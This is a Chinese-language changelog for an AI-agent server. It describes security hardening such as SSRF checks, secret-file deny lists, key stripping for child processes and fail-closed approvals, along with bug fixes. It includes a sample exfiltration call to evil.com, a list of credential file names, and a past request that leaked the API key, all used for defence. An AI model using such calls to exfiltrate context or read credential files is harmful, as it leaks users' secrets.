# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **联网能力（可选，默认关）**：新增 `src/tools/web.ts` 的 `web_fetch` / `web_search`，由 `PI_WEB=on`（或 `buildAgent({ web: true, webClient })`）开启。补齐了「`rules.md` 要求一切外部事实必须工具核实，但默认装配里根本没有联网工具」这个能力缺口。默认关闭的理由与 `coding` 档一致且更直接：**出站网络是数据外泄通道**（`web_fetch("https://evil.com/?d=<上下文内容>")`），而本服务默认无鉴权。
  - **后端可注入**：`WebClient` 接口（`fetchPage` + 可选 `search`），换搜索源 / 加缓存 / 加审计只改实现，工具契约与模型侧不变；`lib.ts` 已导出类型。
  - **SSRF 防护**：只放行 http/https，拒绝回环 / 私有 / 链路本地 / 组播 / CGNAT / IPv4 映射地址，**并检查 DNS 解析结果**与**重定向后的最终地址**（`::ffff:127.0.0.1` 会被 `new URL()` 归一化成 `::ffff:7f00:1`，十六进制写法同样覆盖）。`isPrivateAddress` 认不出的输入按私有处理（fail-closed）。
  - **限额**：字节上限（默认 256KB，硬顶 2MB）与超时（默认 15s，硬顶 60s）都夹取，模型无法用参数顶掉；超限是**边读边停**，不把整页拉进内存。
  - **不假装能搜**：后端没有 `search()` 时**不注册** `web_search`（与 `rag:smoke` 打印 SKIP 同一原则）；默认的 DuckDuckGo 无 JS 版解析是 best-effort，抽不到就如实说「没有命中」。
  - 能力标签 `net` → `inferRisk` 判 `medium`；与 `exec` 同口径**不进 `allTools`**，开了才登记进 `ToolRegistry`。`SECURITY.md` / `.env.example` / 两份 README 都已注明「未被缓解的部分」（URL 由模型决定，DNS 解析与建连之间存在 TOCTOU 窗口）。

- **参考手册（从源码生成）**：新增 `docs/参考手册.md` + `scripts/visualization/generate_reference.mjs`，把「能力面」整个算出来：34 条 WS 客户端命令与 21 个服务端帧（按分组 + JSDoc 摘要）、60+ REST 路由处理器、工具清单（装配档位 + 能力标签 + 风险）、全部 58 个环境变量、全部 npm 脚本、模块地图。此前 WS 协议有 57 个消息类型却**没有任何参考文档**，REST 有 60+ 路由而 README 只列了 4 个，22 个环境变量在两份 README 里一个字都没有。
  生成过程自带一致性断言（不通过即非零退出）：解析出的客户端命令集合必须与 `protocol.ts` 里带编译期守卫的 `CLIENT_MESSAGE_TYPES` 完全一致（**拿编译期保证校验解析器本身**）；`src/tools/*` 里的每个工具名必须在生成器的分组表里被登记，**新增工具忘了归类会直接让门禁红**；代码引用的 `PI_*` 必须都在 `.env.example` 登记过。`npm run docs:check` 已进 `verify` 与两套 CI。
  **刻意没做**：给协议命令强制要求 JSDoc。当前说明覆盖率是客户端 4/34、服务端 7/21，手册如实印出覆盖率，但不设成门禁——逼出来的空说明比没有说明更糟。

- **README 的可验证数字改为生成**：新增 `scripts/visualization/generate_readme_numbers.mjs`，把文件数 / 行数 / 用例数 / 路由数从源码算出来写进 `<!-- BEGIN:generated-numbers -->` 标记块，`npm run docs:numbers:check` 已进 `verify` 链与两套 CI。此前同一份 README 里 `42 test files · 376 cases` 与 `# 376 unit + integration tests` 对着不同的数字。

### Security

- **Linux / macOS 的 `exec` 主执行路径不再继承 `PI_API_KEY`（P1-2 漏网之鱼）**：`src/exec/runner.ts` 的 `/bin/sh` 分支此前直接传 `process.env`，而 `src/child-env.ts` 的模块说明声称「凡是 spawn 子进程的地方都从这里取 env」——它恰好是唯一没兑现的地方，也是**主平台**。现改为 `childProcessEnv()`，并修正同文件 `taskkill` 分支里那句「凡 spawn 口径一致」的注释。新增 `src/exec/runner.test.ts` 用例锁定：子进程读不到 `PI_API_KEY` / `PI_API_KEY_<PROVIDER>`，但 `PATH` 等必须保留（否则 shell 与外部工具跑不起来）。

### Fixed

- **快照周期内不再重复取会话统计（P2-1）**：`getSessionStats()` 在 SDK 里是 `sessionManager.getEntries()` —— 每次调用都会 `fileEntries.filter(...)` **全量复制再全量扫描**一遍会话条目，而快照每个周期都要读它。现改为**按事件失效、周期内复用**：只有流式增量（`message_update` / `tool_execution_update`）不作废缓存，其余事件一律作废（保守方向：宁多算一次，也不显示过期 token / cost）。`src/integration.test.ts` 有用例锁定「流式期间不重复取数、`message_end` 后必然重取」。
- **投影签名的构造少了两次分配（P2-2）**：`projectMessage` 的签名从「数组 + `join("|")`」改为模板串 —— 同一个结果，但不再为每条消息先造 n 个中间字符串（这个签名每个快照周期都要为每条消息重建一次）。同时把 `estimateTokensCached` 的注释改正：它是 O(消息条数) 次 WeakMap 查询，**不是**注释原先声称的 O(新增消息数)。
- **`docs/项目分析报告.md` 会主动误导读者（文档一致性）**：它写于 0.3.0 之前，把一批**已经修好**的问题仍列为现状（`/files/read?path=.env`、`PI_API_KEY` 继承、`db.query()` 全量载入、子代理队列无上限…），并且在同一份文档里给出两组互相矛盾的验证数字（§0 记 `smoke 23/23`、`e2e 39/0跳`，§8 表记 `smoke 17/17`、`e2e 35+1跳过`），`§1.2` 的文件数也自相矛盾。现改为**归档页**：明确标注「历史快照，不再是现状描述」，逐条给出「当时判断 → 现在状态 + 依据」的对照表，并指向 `智能体视角评估.md` / README 的 Numbers / CHANGELOG 三个现状来源。正文通过 git 历史保留。
- **`docs/能力与边界.md` 的三处过期**：基线 `e24c4c7` → `v0.3.0` 及其后工作区（且不再手写规模数字，改为指向生成的 Numbers 表）；「HITL 前端未接」→ 前端已接（`web/src/components/HitlDialog.tsx`）；「`docs/` 下只有三份活文档」→ 与实际目录一致，并区分手写与生成物。
- **`scripts/release.mjs` 的推送失败信息补上撤销步骤**：原先只给「补推」命令，而走到那一步本地已经被改动过（版本回写提交 + 本地 tag）。现在按本次是否真的产生了回写提交，给出 `git tag -d` 与 `git reset --hard HEAD~1` 的完整还原步骤，并提醒**已推送成功的远程要各自单独回退**（脚本不会替你动已推送的引用）。

### Changed

- **SDK 私有形状访问彻底收敛**：`session.navigateTree` 从 `session-hub.ts` 就地断言改为 `sdk-adapter.ts` 的 `sdkNavigateTree()` —— 此前该文件自己的注释写着「私有访问统一收在 sdk-adapter」，而 `navigateTree` 是那个唯一没兑现的例外。
- **覆盖率门禁（棘轮）**：新增 `scripts/coverage.mjs`，用 Node 内置 `--experimental-test-coverage`（零依赖，与测试同一次运行，不引入 c8/nyc），只看 `src/**`，阈值 `lines>=88 / branches>=77 / functions>=82`（实测基线 89.80 / 79.09 / 83.16，只允许往上调）。低版本 Node 上明确降级为普通测试并打印原因 —— 工具不支持不该被当成覆盖率不达标。已接入 `.github/workflows/ci.yml` 与 `.cnb.yml`。
- **前端依赖也进审计**：`web/` 有自己的 lockfile，原先只审计根包等于前端依赖完全没人管。两套 CI 都补上 `npm --prefix web audit --audit-level=high`。
- **前端测试面扩大**：新增 `web/src/pi/logClient.test.ts`（8 例，无头、`fetch` 打桩），覆盖筛选 → query 映射、非 2xx 的错误文案、AbortSignal 透传，以及 `queryAllForExport` 的分页边界（含「结果恰好等于上限且已无下一页时不得谎报截断」这条回归）。前端用例数 11 → 19。
- **`rules.md` 新增第 10 条（联网）**：有 `web_fetch` 时用它核实外部事实并给出实际 URL；没有联网工具就直说无法核实，不拿记忆里的版本号当真。

## [0.3.0] - 2026-10-10

### Security

- **文件服务敏感文件名黑名单（P1-1）**：`FileService` 新增 `denyNames`（默认 `.env` / `.env.*` / `*.pem` / `*.key` / `*.p12` / `*.pfx` / `id_rsa` / `id_ed25519` / `auth.json` / `credentials*` / `.npmrc` / `.netrc`），在 `resolvePath` 之后按 basename 拦（fail-closed），`/files/read`、`/files/raw`、写入与目录列表（**含列表预览**）全部覆盖。此前 root 就是 `process.cwd()`，`.env` 正好躺在那里，`GET /files/read?path=.env` 会把 `PI_API_KEY` 原样吐出——与 `provider-keys.ts` 反复强调的「原始 key 及其任何派生形式永不出服务端」直接冲突。业务方可用 `denyNames` 覆盖默认名单。
- **子进程不再继承模型密钥（P1-2）**：新增 `src/child-env.ts`；`exec/runner.ts`（两个 spawn 分支）与 `mcp/client.ts` 一律从 `childProcessEnv()` 取环境，剔除 `PI_API_KEY` / `PI_API_KEY_<PROVIDER>`。MCP 服务器**自己**的凭据仍由调用方经 `options.env` 显式传入，不受影响。
- **guard 路径校验升级为 realpath（P1-3）**：`isPathInsideCwd` 现在解析「最近已存在祖先」的 realpath，基准用 cwd 自身的 realpath（避免 macOS `/tmp`、从链接目录启动时把合法操作误判为越界）。read / write / edit / ls / grep / find 与 `FileService`、`exec` **同强度**，符号链接逃逸不再只靠文件服务那一层拦。
- **危险命令表收敛为单一事实源（P1-3）**：新增 `src/extensions/shell-rules.ts`，`guard` 与审批 `BUILTIN_RULES` 从同一份表派生。此前两张表**已漂移**（审批表多了 `git-destructive` / `chmod-recursive`，guard 没有）。guard 的硬拦截集合刻意保持原有 6 条不变（这两条交给审批 `ask`），因此**行为完全不变**，只是消除了漂移。
- **文档降调**：README（中英）`coding` 段落与「进阶」段落不再暗示 guard 能约束 `bash` 命令体；明确「不是沙箱、`bash` 命令体无路径约束、正则可被绕过、要真隔离请用 `Dockerfile` / `sandbox.example.ts`」。
- **`killProcessTree` 的 `taskkill` 也裁剪环境（P1-2 补漏）**：`exec/runner.ts` 在 Windows 上 spawn `taskkill` 时**没有传 `env`**，同样会继承 `PI_API_KEY`。现在凡是 spawn 的地方口径一致（`exec` 主命令 / 后台任务 / MCP / taskkill）。
- **agent 自己的内置工具也不许碰敏感文件（高危，与 P1-1 同一条铁律的另一半）**：`guard` 原先只判「路径在不在工作目录内」，而 `.env` **恰好就在**工作目录里——于是默认配置下 `read` 就能把模型 Key 读进上下文（`read` 在任何档位都可用；审批 `builtin:secret.access` 是 `ask`，而 `toolApprovalEnabled` 默认 `false` 时 ask 被压制为 allow）。现 `guard` 对 `read`/`write`/`edit`/`ls`/`grep`/`find` 追加敏感文件名拦截，**与 HTTP 文件服务共用同一份名单**（新模块 `src/secret-files.ts`）。
- **sqlite 向量库落盘权限收紧（注释曾承诺 0o600，实际从未设置）**：`new DatabaseSync(path)` 按进程 umask 建文件（通常 0o644），而向量可能反映私有文档内容。现显式 `chmodSync(path, 0o600)`，与 `provider-keys.ts` / `setup.ts` 的做法一致（Windows 上尽力而为）。
- **`denyNames` 的两个绕过点**：① 只看字面 basename —— root 内 `notes.txt -> .env` 的链接可读到 `.env`，现追加**真实目标 basename** 校验；② 更危险的是 `list()` 的**预览**走绝对路径直接读、不经过 `resolvePath`，条目一旦被列出就把 `.env` 内容当预览吐出——现在真实目标命中名单的条目**连列都不列**。
- **【安全】审批应答 fail-open：非法 / 缺失的 `decision` 一律放行**：`ApprovalGate.resolve()` 原先只特判 `"deny"`，其余取值全部落进 allow 分支——而协议类型只是**编译期**约束，WS 上收到的是任意 JSON，于是 `{"decision":"x"}`（或漏字段、大小写不符写成 `"Allow"`）就能让 `ask` 档工具在无人同意时执行，审批形同虚设。现改为 fail-closed：只有 `allow` 与 `modify` 放行，其余全部按拒绝；`modify` 未带 `modifiedArgs` 也判拒绝（否则等于拿**原始危险参数**执行）。`deny` 仍是硬闸门，不受策略记忆影响，语义不变。

### Fixed

- **`db.query()` 不再全量载入（P2-1）**：改用 `stmt.iterate()` 边取边判，只物化前 `maxRows` 行，其余行只计数；`totalRows` 仍报**真实总数**（既有承诺不变）。原实现 `stmt.all()` 会把整张表物化进内存，行数上限只限制了「返回多少行」，没限制「载入多少行」——注释与实现自此一致。
- **上传二进制不再损坏（P4）**：新增 `FileService.writeBinary()`，`/files/upload` 改走它。原实现 `write(path, buf.toString("utf8"))` 会把非 UTF-8 字节替换成 U+FFFD，且 `write` 本身又拒绝二进制扩展名，两头都对不上。
- **`.env` 加载失败不再静默（P4）**：`loadEnvFile` 只在文件**不存在**时静默跳过；文件存在但解析失败时告警——一个笔误（引号没配对等）以前会让整份 `.env` 静默失效，表现为「Key 明明填了却说没配」。
- **`buildState` 不再残留死字段 `rev: 0`（P4）**：`SnapshotEmitter` 的 `buildState` 契约改为 `Omit<UiState, "rev">`，revision 链由发射器独占（`++this.rev`）并在两个分支注入；那个看似生效实则被覆盖的 `0` 不复存在。
- **`isClientMessage` 收紧形态校验（P4）**：拒绝数组、空串与纯空白 `type`；合法命令名（内置命令与 `defineCommand` 注册的业务命令，均不含空白）不受影响。
- **子代理等待队列加上限（P2-3）**：新增 `DEFAULT_MAX_QUEUED_SUBAGENTS = 32` 与 `SubagentRunnerOptions.maxQueued`；超限**明确回绝**并给出可读原因，而不是堆起一串永不 resolve 的 Promise。并发上限内仍是排队（既有语义不变）。
- **`Metrics` 对未知指标名不再抛（P2-3）**：收敛为私有 `keyOf()`，未知名字静默忽略——与代码注释声明的契约一致（拼错的指标名绝不能带崩一次请求）。
- **文档事实性纠错（README 中英）**：原文称「`.env` 里的 `PI_API_KEY` 只给 setup 用、不在请求路径上」——不实：服务端会把 `.env` 载入 `process.env`（模型调用正是用它鉴权），`/providers` 也会把它标成密钥来源。现改述为「确实存在于服务端进程，但刻意不被子进程继承」，与新加的 `child-env.ts` 一致；同时把陈旧的测试数字（37 文件 / 308 用例、smoke 17 项）校为 42 文件 / 357 用例、smoke 21 项。
- **WS 错误文案统一脱敏（内部信息曾原样外泄）**：`transport/ws.ts` 有 **6 处**直接 `err.message` 回给客户端（`set_model` / `cycle_model` / `set_settings` / 顶层 `dispatch` catch / 自定义命令），而 REST 侧一直用 `clientMessage()` 脱敏——同一类失败「REST 干净、WS 泄漏绝对路径与驱动信息」。新增 `http/errors.ts` 的 `clientErrorMessage(err, fallback?)`，三条通道共用。**例外**：自定义命令是业务可控边界（`defineCommand` 作者自己决定文案，由 `extensions.test.ts` 锁定），故仍转发原文，只对脚手架自产的内部 `AppError` 脱敏。
- **WS 握手前 `pending` 队列加上限（可与 `maxPayload` 组合成内存耗尽面）**：`maxPayload` 只限单帧字节、不限帧数，一个不发 `hello` 的连接可以持续灌小帧，且这些命令在 `flushPending()` 后仍会被依次执行。现超过 `MAX_PENDING_BEFORE_HELLO = 64` 即计 `protocolErrorsTotal` 并 `terminate()`。
- **WS `set_tool_enabled` 缺布尔校验会静默禁用工具**：漏传 `enabled` 时 `undefined` 落到 `else` 分支 → **静默禁用该工具**且回 `ok:true`（REST 同输入返回 400）。现显式校验 `{ name: string, enabled: boolean }`；`set_model` 同样补非空 `modelId` 校验。
- **`thinkingLevel` 两条写入路径口径分叉**：`set_thinking`（WS）用严格枚举，而设置 schema 是「任意 ≤32 字符字符串」→ `PATCH /settings {"thinkingLevel":"garbage"}` 能被接受并存盘。现两者同源于 `protocol.ts` 的 `THINKING_LEVELS` / `SETTINGS_THINKING_LEVELS`（含设置层哨兵 `default`）。
- **MCP 客户端 `start()` 漏 `await`**：注入 `spawn` 的分支未等待异步握手 → rejection 逃出 `catch` 变成 unhandled rejection，且紧接着的 `listTools()` 会在子进程未就绪时开跑。
- **MCP 子进程只发 SIGTERM、无 SIGKILL 升级（注释谎称有）**：忽略 SIGTERM 的 MCP server 会变成孤儿进程（父进程退出后仍存活，占着端口/句柄）。现 SIGTERM 后 2s 未退出即 SIGKILL（定时器 unref，不拖住事件循环退出；退出状态由 `onExit` 维护，不读 `McpProcessHandle` 未暴露的字段）。
- **子代理截断结果超过声明的 `maxChars`**：返回 `half + marker + half`，marker 未计入预算，"上限"实际是上限 + marker 长度。现把 marker 算进预算，并在上限小到放不下 marker 时改为硬截断（仍然 ≤ 上限）。
- **`maxOpenConversations = 1` 会静默突破上限**：`evictForCapacity()` 只淘汰非 active，而 cap=1 时唯一那条就是 active → 无候选 → 插入后变成 2。现夹到 2 并告警（cap=1 与「永不淘汰活动会话」本就互相矛盾，与其悄悄超出不如让行为可预期）。
- **看门狗上限淘汰从此可见**：512 上限回收最旧一条是**有意的**资源保证（`pendingCount <= 512` 由测试锁定），但原来是静默的——被回收的那条若仍在跑就失去超时保护。现在回收前记 warn（保留有界保证，去掉静默）。
- **文件日志 sink 头部注释的文件名漂移**：注释写 `pi-starter-YYYY-MM-DD.log`，实际是 `<base>-<date>.<seq>.log`。

#### 前端（`web/`）

- **【高危】跨会话帧污染当前视图（3 处同源）**：后端每条已打开对话都把帧推到**同一个** socket（`ClientSession.emit` 不按 active 过滤），而协议里 `snapshot_delta` / `message_delta` / `tool_status` / `tool_delta` / `run_start` / `run_end` / `turn_start` **都带 `conversationId`**。前端全部不比对，于是"在 A 里发 prompt、切到 B"之后：A 的流式文本被拼进 B 的 `streamText`、A 的工具轨迹混进 B 的列表、A 的 `run_start` 把 B 标成运行中，而 A 的**全量快照会整个替换掉 B 的消息**。最离谱的是 `snapshot_delta` 的跨会话分支——注释写"直接丢弃"，实现却是调 `resetConversationView()`，**把当前会话清空**（比不过滤更糟）。现新增 `belongsToView()` 统一按 `conversationId` 过滤，并新增 `dropForeign()` 计数 + 首条告警（出现即说明有并发生成的后台会话）；切/建会话期间按"期望会话 id"过滤，避免抢跑的后台快照先建立身份。
- **思维链在流式中"闪断"**：全量 `snapshot` 只回填 `streamText`、把 `streamThinking` 置空，下一条 thinking 增量就在空串上累加（`"" + delta`），快照之前累积的思维链整段丢失。现与文本通道同样从 `streamingMessage.thinking` 回填。
- **重连退避定时器无句柄**：`disconnect()` 取消不掉已排定的 `setTimeout`，退避到期后仍会 `open()`；且 `open()` 不检查 `closedByUser`，于是断开后多出一条无人管理的僵尸 socket（其 close 又不再重连）。现保存句柄并在 `disconnect()` 取消，`open()` 入口再确认一次。
- **离线时静默丢帧且擅自清空视图**：`send()` 在非 OPEN 时静默 return；`newConversation/openConversation/switchConversation` 即使发送失败也照样 `resetConversationView()`——用户看到消息被清空、却什么都没发生。现 `send()` 返回布尔并给出一次性提示（去重，避免高频连发刷屏），三个切换命令失败时**不动本地视图**。
- **`HitlDialog` 在 render 阶段产生副作用**：`notify` 的自动应答写在渲染体里，而 `respondUi` 会 `send` + `patch`（改外部 store 并唤醒其它订阅者）——React 明令禁止，可能形成重渲染环。现移入 `useEffect`，并用 `ref` 记录已应答 id（effect 在双挂载下会重跑，重复应答会被服务端当成未知 id 而回提示帧）。
- **`ErrorBoundary` 不覆盖适配层**：`useExternalStoreRuntime(usePiRuntime())` 写在 `App` 自己的渲染里，而边界只在它的子树内——适配层一抛错就整页白屏，与注释"至少给出可读错框"不符。现把适配层创建移进边界内的 `RuntimeShell`。
- **思考档枚举漂移（且注释自称与后端一致）**：前端硬编码 5 档，协议是 7 档——`xhigh` / `max` 在下拉里根本选不到。现从 `@pi/protocol` 导入 `THINKING_LEVELS`（与 `set_thinking` / 设置 schema 同一份）。
- **未知帧静默丢弃**：`switch` 的 `default` 与 `pong` 共用且无日志，新增帧（如协议将来的字段）会无声消失，排障时最难查。现未知类型告警一次（按类型去重），并对**刻意不消费**的帧（`settings_state` / `knowledge_hits` / `turn_end`，前端不调对应命令、无消费者）显式列白名单，不算漂移。
- **日志面板卸载后 setState / 不 abort**：面板关闭即卸载，但 `flashCopied` 的计时器不清理、在途 `fetch` 只在"下一次查询"时才被 abort。现加卸载清理（abort + clearTimeout）与 `aliveRef` 守卫，另 `selectEntry` 的异步 `setContext` 同样加守卫。
- **`payload()` 与 `toUiResponsePayload()` 两份同逻辑实现**：前者在组件里、后者在 client 里且无人调用，`confirm`/取消语义需人工保持同步。现统一用 `client` 里的一份。

#### 第三轮审计：此前从未覆盖的模块（`knowledge/` · `log-routes` · `log-panel` · `scripts/`）

- **【数据丢失】批量删除会删掉当前正在用的会话**：`ThreadManager` 的复选框用 `disabled={isCurrent}` 在渲染期挡住当前会话，但**拦不住"先勾选、再切到该会话"**——撤选集合的 effect 只清"已消失"的 id，不清"已变成 current"的 id，于是点「删除所选」会把当前会话连同磁盘文件一起删掉（不可恢复）。现 effect 跟随 `current` 收敛，`submit()` 再按当下值挡一次。
- **【安全】「改写后允许」把字段摘录当成完整入参发出去**：该按钮把 `approval.preview`（只是 command / path / params 的**摘录**）当作改写后的工具入参 JSON——解析成功就会用**错误且不完整**的参数放行工具，解析失败则静默退化成普通「允许」，文案既没兑现又制造了一次错误执行。现**移除该按钮**；要真正支持改写需要协议让 `UiApproval` 携带完整入参（见下方"未做"）。
- **【安全】审批放行范围会跨审批残留**：`ApprovalCard` 常驻挂载（`pendingApproval` 为空时只是返回 null，实例不销毁），上一次选的「本对话全部」会留到下一次——用户顺手点「允许」即意外放行整段规则。现在每条新审批（按 `requestId`）重置为「仅本次」。
- **日志分页游标越过一次轮转就必然 400**：游标里存的是**文件名**，而大小轮转会把 `X.log` 归档成 `X.log.gz` 并 unlink 原文件 → 下一页 `indexOf === -1` → 400，与模块"无损…绝不静默丢弃"的硬约束直接冲突。现在游标文件消失时先找 `.gz` 同名归档（压缩流上字节偏移无意义，从该文件开头重来——宁可重复几行也不丢），再退到"名字排在它之后"的第一个文件；确实到头才返回空页。
- **一个恒为 `true` 的冒烟断言（门禁假绿）**：`scripts/smoke-ws.mjs` 里 `check("queued prompt replayed…", true)` 没有任何检查，却在 `npm run verify` → `npm run smoke` 链里，握手套路回归会直接漏网。现改为发送一条**缺 `text`** 的排队命令（dispatcher 必然回确定性的 `prompt text is required`），用那条错误帧断言"确实回放了"——不依赖模型可用性。
- **【数据丢失】`deleteByChunkPrefix` 用 `LIKE` 导致误删**：文档名来自 `.md` 文件名，而 LIKE 里 `_` 匹配任意单字符、`%` 匹配任意串——`a_b.md` 会连带删掉 `aXb.md` 的全部向量（静默、无报错）。改为定长前缀精确匹配（`substr(id,1,?) = ?`）。
- **改标题不会重算向量**：chunk id 只哈希 body，而送去向量化的文本是 `title\nbody`——改 frontmatter 的 `title` 时 id 不变 → `store.has()` 命中 → 跳过 embedding，库里留着旧向量而 snippet 已是新文本（评分与展示不一致）。现 id 由**同一个** `embedText()` 派生（改标题会留下孤儿向量，`search` 用 `chunkById` 过滤，不会变成"没有正文的命中"）。
- **聚合式检索欠取**：向量检索只取 `limit*3` 个 chunk 再按文档聚合，某篇长文档霸榜时会把其它文档整篇挤出窗口，返回的文档数少于 `limit`。现取样窗口逐步翻倍，直到拿到 `limit` 篇不同文档或取尽已知 chunk。
- **日志面板的竞态**：① 被新请求取代的旧请求在 `finally` 里仍会 `setLoading(false)`，把新请求刚点亮的指示器提前熄掉（`abort` 的 rejection 是微任务）；② 2 秒一次的自动刷新会 abort 掉用户刚点的「加载更多」，表现为点了没反应；③ 快速先后点两条记录时，先发后到的链路响应会覆盖后选的条目；④ 「导出」「错误统计」在面板卸载后仍 `setState`（甚至弹出下载）。现用请求序号（只让最新一次写结果与 loading）、`appendInFlight` 让轮询避让、以及补上缺失的 `aliveRef` 守卫。
- **导出谎报"已截断"**：`queryAllForExport` 把 `collected.length >= maxEntries` 探在 `hasMore` 之前——结果总数**恰好等于**上限且已无下一页时，一条都没丢却提示"结果超过导出上限，请缩小时间范围"。现先判是否还有下一页。

#### 第四轮审计：协议边界与生命周期（审批应答 / WS 会话身份 / MCP 停机 / 日志句柄）

- **同一 socket 二次 `hello` 换 `clientId` 会泄漏旧会话**：`attach()` 只 dispose **同 id** 的旧会话，而 socket 关闭时的 `dispose()` 又只按**最后**的 `clientId` 清理——于是换身份后，旧 `ClientSession` 及其全部会话订阅永远留在 `hub.sessions` 里，并且仍在往同一个 socket 推帧。现换身份前先 `hub.detach(旧 id)`。
- **并发 `new_conversation` 能突破 `maxOpenConversations`**：容量检查（`evictForCapacity()`）与插入之间隔着 `await factory()`，而 WS 是 `void dispatch`、命令天然并行——两个并发新建都能先通过检查、再各自插入，把 `size` 抬到 `cap+1`（每个对话都持有一个完整 AgentSession）。现分配完成后再补收一次。
- **【资源】MCP 握手中途 `dispose()` 留下孤儿子进程，并把工具注册回已停机的注册表**：子进程此时还没进 `connected`，`dispose()` 扫不到它；而握手完成后代码会继续往下走，`connected.set()` + `registry.register()` 把一个「已停机」的桥又填了回来（工具复活）。现 `connect()` 在注册前重查 `disposed` 并自己收尸，`McpClient.start()` 也拒绝在停机后拉起子进程。
- **【功能】并发 `sync()` 会丢掉配置变更**：在途时到达的调用直接返回那一轮的 promise，而 `runSync()` 在入口就读了 `servers()`——握手最长 15s，期间改的配置**不会生效**，要等下一次变更才被发现。现记账并在跑完后补跑一轮（「两次并发 sync 只拉起一份子进程」这条既有保证不变）。
- **读日志出错时不关句柄**：`readLogForward()` / `readGzAll()` 没有 `try/finally`，扫描途中文件被轮转 / 归档（I/O 报错）时 `readline` 与底层流都不会释放（`readLogBackward()` 一直有 `finally`，现对齐）。
- **模型轮换静默失败**：`applyModel()` 把每条对话的切换失败**整个吞掉**（连日志都没有），UI 显示「已轮换」、部分后台对话却仍在跑旧模型，且零信号。现逐条告警，有失败时另推一条 notice。

#### 第四轮审计（前端）：离线误清状态、后台帧抢占新会话身份

- **离线时点「允许」会把卡片清掉**：`approvalResponse()` / `respondUi()` 不检查 `send()` 的返回值就清本地 `pendingApproval` / 反问列表——用户以为已放行，后端却从没收到（这一轮会一直卡在等审批、直到超时才被判拒绝），而卡片已经消失、无法重试。现仅在真正发出后才清；`respondUi()` 返回布尔，`HitlDialog` 据此决定是否把 notify 记成「已应答」。
- **新建会话期间，后台会话的增量帧会抢占新会话身份**：`belongsToView()` 在 `pendingConversationId === null`（`new_conversation` 的目标 id 由服务端分配，此刻未知）时对**任意** `conversationId` 放行——抢跑的后台会话的 `snapshot_delta` 会先把身份占住，随后真正的新会话快照反而因 id 不匹配被丢弃，用户看到的是别人的对话、自己的消息被拼到对方缓冲上。现该状态下只放行权威全量 `snapshot`。
- **流式缓冲跨轮残留**：`run_start` 没有清 `streamText` / `streamThinking`（后端在 `agent_start` 时是清的），上一轮的文本 / 思维链会与新轮的首个增量首尾相接。
- **日志面板「错误统计」竞态**：快速连点时会先发后到的旧响应覆盖新结果（并可能写入 error）。现与 `runQuery()` 同口径加请求序号守卫。
- **导出 `URL.revokeObjectURL` 过早**：紧挨着 `a.click()` 就 revoke，Firefox / Safari 对大 Blob 可能来不及取走 URL，表现为下载被取消或空文件。现延后到下一轮事件循环。

#### 第五轮审计：性能与配额（热路径 / 无界增长）

- **快照判断 `overBudget` 每周期按字符重算全部消息**：`planTrim()` 内部用**未缓存**的 `estimateConversationTokens()`，而 `buildState()` 每个快照周期都要调它一次（流式期间每 2s 一次，n = 会话总字符数）——调用方手上本来就有逐条 token 缓存。现给 `TrimPlanInput` 加可选 `estimatedTokens`，由持有缓存的调用方把总数传进来（与 `estimateConversationTokens()` 同一套公式，结论逐字一致）。
- **`GET /db/notes` 无行数上限**：`notes` 可被 `insertNote` 无界写入，整表进响应会把内存与延迟放大成外部输入的函数。现与 `db.query()` 同口径限行。
- **文件日志的保留策略只在启动时生效一次**：`sweepRetention()` 原先只在进程启动跑——长跑进程里 `retentionDays` 形同虚设，分段文件在同一进程生命周期内无限累积（单文件受 `maxSize` 限，**段数**不受限）。现每次轮转也清理。
- **`search_knowledge` 的 `limit` 直接来自模型且无上界**：一句 `limit: 100000` 就能把整库正文拖进一轮上下文。现夹到 `[1, 50]`（非数值 / 越界一律回落默认值）。
- **`toolStartTimes` 在 abort 时按 `toolCallId` 泄漏**：配对的 `tool_execution_end` 因打断而不来时条目就留在会话里。现与 `toolDurations` 同口径封顶（500，丢最早）。
- **审批策略表按 sessionId 只增不减**：每个曾出现过的会话 key 留一条，随进程生命周期单调增长。现设上限 1024 并挤出最早的一条——代价顶多是那条早已关闭的会话重新问一次（`deny` 是硬闸门，不受策略影响）。

### Changed

- **快照构建去掉一次全量重投影（P2-2）**：`planTrim()` 现在接受已投影好的消息数组，`buildState` 复用本次的 `allMessages`。原先每周期会把 `currentMessages()` 跑两遍（连带两遍会话树遍历），流式输出时每 60ms 重复一次。
- **双通道整形去重（P3-3）**：新增 `src/capabilities.ts`（`buildCapabilityBase`）与 `models.ts` 的 `toUiModel()`；REST `GET /capabilities`、`/info` 与 WS `capabilities` / `models` 帧共用同一整形函数，字段规则不再分叉（顺带把 `/info` 的 `name` 缺省回落对齐到 WS 的 `name ?? id`）。
- **SDK 私有形状收敛到 `src/sdk-adapter.ts`（P3-2）**：`session.sessionManager` / `agent.state.messages` / `compact` / `abortCompaction` / `cycleModel` / `cycleThinkingLevel` / `setSessionName` 这些**未从 SDK 公开类型导出**的形状，原先散落在 `session-hub.ts` 各处、各写一遍 `typeof === "function"` 兜底——升级 SDK 时的表现是「有些点静默失效、有些点抛错」，且没有任何一处能列出「我们依赖了哪些私有形状」。现全部收敛为带存在性检查的访问器（缺失即返回 `undefined`，由调用方显式降级；`sdkRenameSession` 把「官方 setter → sessionManager 退化」的两条私有路径也封在里面）。语义与抽取前**逐字一致**，该模块自身的「形状缺失即降级、不抛」契约有单测锁定。
- **`createSessionHubFromOptions()`（P3-5，非破坏式）**：新增具名参数入口并在 `server.ts` 使用；原 8 位置参数版 `createSessionHub()` 保留为转调具名形式的 `@deprecated` 适配器，**既有嵌入方零改动**（`lib.ts` 两个都导出）。
- **CI 补上前端**：`web/` 此前在 CI 里**完全没有被覆盖**（既不 typecheck 也不 build，只有一个跑不起来的 lockfile 存在）。现新增独立的 `frontend` 作业（ubuntu 单作业，不进 9 路矩阵）：`npm ci --prefix web` → `lint` → `typecheck + build` → 上传 `web/dist`；并在矩阵作业的 Test 之后加 `npm run test:web`（复用根 tsx，**不需要 web/node_modules**——已实测在移走 `web/node_modules` 后 7/7 通过，所以不会给矩阵作业增加安装成本）。
  注意：**没有**把 `npm --prefix web run check:official` 放进 CI——它当前**退出码为 1**（官方 registry 组件已有 11 处内容不同 / 3 处本地缺失）。那是需要单独决策的对齐工作，直接进门禁会把流水线变红。
